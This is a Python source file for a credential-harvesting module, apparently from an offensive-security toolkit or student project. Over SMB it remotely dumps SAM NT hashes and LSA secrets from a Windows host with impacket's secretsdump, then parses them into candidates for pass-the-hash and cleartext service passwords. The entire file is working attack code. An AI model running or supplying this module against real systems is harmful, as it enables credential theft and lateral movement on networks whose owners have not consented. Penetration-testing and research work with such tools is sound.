# modules/mimir.py

BANNER = r"""
                █   █ ███ █   █ ███ ████    
                ██ ██░ █░░██ ██░ █░░█░░░█   
                █░█ █░░█░░█░█ █░░█░░████░░  
                █░░░█░░█░░█░░░█░░█░░█░░█░ ░ 
                █░░ █░███░█░░ █░███░█░░░█░  
                 ░░  ░░░░░ ░░  ░░░░░ ░░  ░  
                  ░   ░ ░░░ ░   ░ ░░░ ░   ░ 

                      _,-~~~~~~~-,_
                   ,-'             '-,
                 ,'  ᚠ  ᚨ  ᛟ  ᚱ  ᚹ     ',
                (   ᚢ               ᚦ   Y
               {     ᛗ             ᛞ    I
              {      -                   `,
              |       ',                  )
              |        |   ,..__      __. Y
              |    .,_./  Y ' / ^Y   J   )|
               \           |' /   |   |   ||
                \          L_/    . _ (_,.'(
                 \,   ,      ^^""' / |      )
                  \_  \          /,L]     /
                    '-_~-,       ` `   ./`
                       `'{_            )
                           ^^\..___,.--`
                  
    ---------------------------------------------------------
           LSASS Memory Process & Harvesting Module
                Author: Bruno Paniagua García
    ---------------------------------------------------------
"""

from state import CredentialCandidate
from utils import ratatoskr as log

try:
    from impacket.examples.secretsdump import RemoteOperations, LSASecrets, SAMHashes
except ImportError:
    RemoteOperations = None
    LSASecrets = None
    SAMHashes = None


def dump_credentials(access):
    """
    Vuelca secretos de un host admin (SMB) via secretsdump:
      - SAM  -> hashes NT de cuentas locales (para pass-the-hash)
      - LSA  -> contraseñas en claro de cuentas run-as de servicios (admin.tfg)

    Devuelve: {"status": "success"|"empty"|"error", "candidates": [...]}
    """
    if RemoteOperations is None:
        raise RuntimeError("impacket no esta instalado. Ejecuta: pip install impacket")

    candidates = []
    remote_ops = None

    def _sam_callback(*args):
        # Firma variable entre versiones (impacket 0.14 pasa 3+ args):
        # el secreto (linea con el hash) es SIEMPRE el ultimo argumento.
        secret = args[-1]
        if isinstance(secret, bytes):
            secret = secret.decode("utf-8", errors="ignore")
        parts = secret.split(":")
        if len(parts) >= 4 and parts[0] and parts[3]:
            candidates.append(CredentialCandidate(
                username=parts[0], secret=None, nt_hash=parts[3],
                source="lsass_sam", location=access.host, evidence=secret,
            ))

    def _lsa_callback(*args):
        secret = args[-1]
        if isinstance(secret, bytes):
            secret = secret.decode("utf-8", errors="ignore")
        if ":" not in secret:
            return

        left, _, right = secret.partition(":")
        user = left.split("\\")[-1].strip()
        pwd = right.strip()

        # Descartar ruido que NO es una contraseña en claro:
        #  - cuentas de maquina (terminan en '$'): claves/hashes, no passwords
        #  - claves Kerberos: 'aesXXX-...', 'des-cbc-md5:...'
        #  - hashes NT/LM: 32 hex, o el formato 'lm:nt:::'
        #  - secretos de sistema tipo NL$KM, DPAPI, _SC_ que no son user:pass
        if user.endswith("$"):
            return
        if right.strip().lower().startswith(("aes", "des", "rc4", "0x")):
            return
        if left.strip().upper() in {"NL$KM", "DPAPI_SYSTEM", "DPAPI_USERKEY"}:
            return
        # Un hash NT es 32 hex; una clave Kerberos es larga en hex -> no password
        import re as _re
        if _re.fullmatch(r"[0-9a-fA-F]{32,}", pwd):
            return

        if user and pwd and 0 < len(pwd) < 200:
            candidates.append(CredentialCandidate(
                username=user, secret=pwd, nt_hash=None,
                source="lsass_lsa", location=access.host, evidence=secret,
            ))

    try:
        log.debug("mimir: RemoteOperations + enableRegistry")
        remote_ops = RemoteOperations(access.connection, doKerberos=False)
        remote_ops.enableRegistry()

        log.debug("mimir: getBootKey")
        boot_key = remote_ops.getBootKey()

        log.debug("mimir: volcando SAM")
        sam = SAMHashes(remote_ops.saveSAM(), boot_key, isRemote=True,
                        perSecretCallback=_sam_callback)
        sam.dump()
        sam.finish()

        log.debug("mimir: volcando LSA secrets")
        lsa = LSASecrets(remote_ops.saveSECURITY(), boot_key, remote_ops,
                         isRemote=True, perSecretCallback=_lsa_callback)
        lsa.dumpSecrets()
        lsa.finish()

    except Exception as e:
        log.debug(f"mimir: fallo en volcado: {type(e).__name__}: {e}")
        return {"status": "error", "error": str(e), "candidates": candidates}

    finally:
        if remote_ops is not None:
            try:
                remote_ops.finish()
            except Exception as e:
                log.debug(f"mimir: finish() fallo (ignorado): {type(e).__name__}: {e}")

    log.debug(f"mimir: devolviendo {len(candidates)} candidata(s)")
    if not candidates:
        return {"status": "empty", "candidates": []}
    return {"status": "success", "candidates": candidates}